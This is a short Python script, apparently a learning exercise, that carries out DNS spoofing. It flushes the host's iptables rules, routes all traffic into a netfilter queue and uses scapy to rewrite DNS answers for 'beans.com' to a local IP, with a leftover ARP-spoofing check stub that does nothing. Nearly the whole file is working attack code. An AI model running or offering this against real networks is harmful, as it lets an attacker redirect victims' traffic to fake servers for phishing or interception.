#!/usr/bin/env python

# you should probably add a feature that checks if arp_spoof is running

# test feature for arp_spoof checker

def arp_check():
    subprocess.call

import netfilterqueue
import subprocess
import scapy.all as scapy
import time


# set up the program's environment
subprocess.call('iptables --flush', shell=True)
subprocess.call('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
# reminder
print('Remember to turn on UBUNTU server')

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'beans.com' in qname:
            print('[+] Spoofing Target')
            answer = scapy.DNSRR(rrname=qname, rdata='192.168.1.139')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))
    packet.accept()

try:

    queue=netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call('iptables --flush', shell=True)
    print('[+] Quitting program')

